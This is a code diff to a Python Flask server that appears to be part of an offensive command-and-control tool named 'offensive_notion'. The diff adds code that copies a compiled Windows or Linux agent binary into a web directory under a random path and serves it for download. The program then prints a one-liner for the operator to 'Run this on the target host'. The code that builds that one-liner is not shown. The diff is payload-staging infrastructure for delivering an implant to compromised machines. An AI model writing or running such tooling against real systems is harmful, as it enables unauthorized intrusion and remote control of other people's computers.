@@ -1,22 +1,50 @@
-from flask import Flask
+import shutil
+from os import abort
+
+from flask import *
 import string
 import random
 import base64
 import sys
 from utils.colors import *
+from os import getcwd, chdir, path
 
 cli = sys.modules['flask.cli']
 cli.show_server_banner = lambda *x: None
 app = Flask(__name__)
+
+DOWNLOAD_DIRECTORY = getcwd() + "/utils/www"
 
 
 def randomize_str() -> str:
     return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=8))
 
 
-def copy_agent(os, build):
+def copy_agent(os, build, uri):
     # TODO: handle agent copy over
+    web_dir = "utils/www/{}".format(uri)
     print(info + "Copying agent")
+    if os == "windows":
+        agent_path = "x86_64-pc-windows-gnu"
+        bin_dir_folder = "windows_" + build
+        agent_name = "offensive_notion.exe"
+    elif os == "linux":
+        agent_path = build
+        bin_dir_folder = "linux_" + build
+        agent_name = "offensive_notion"
+    else:
+        agent_path = "debug"
+        bin_dir_folder = "linux_debug"
+        agent_name = "offensive_notion"
+
+    try:
+        if os == "windows":
+            shutil.move("bin/{}/{}/{}/{}".format(bin_dir_folder, agent_path, build, agent_name), web_dir)
+        else:
+            shutil.move("bin/{}/{}/{}".format(bin_dir_folder, agent_path, agent_name), web_dir)
+    except Exception as e:
+        print(printError + str(e))
+        exit(1)
 
 
 def generate_payload(lang, host, port, uri):
@@ -52,15 +80,15 @@ def generate_payload(lang, host, port, uri):
     return one_liner
 
 
-@app.route('/')
-# TODO: dynamically generate endpoint and serve out payload
-def hello():
-    return 'Hello, World!'
+@app.route("/<path:path>")
+def get_file(path):
+    """Download a file."""
+    return send_from_directory(DOWNLOAD_DIRECTORY, path, as_attachment=True)
 
 
 def main(host, port, lang, os, build):
-    copy_agent(os, build)
     uri = randomize_str()
+    copy_agent(os, build, uri)
     one_liner = generate_payload(lang, host, port, uri)
     print(important + "Run this on the target host:\n" + recc + one_liner + Fore.RESET + "\n")
     app.run(host=host, port=port)
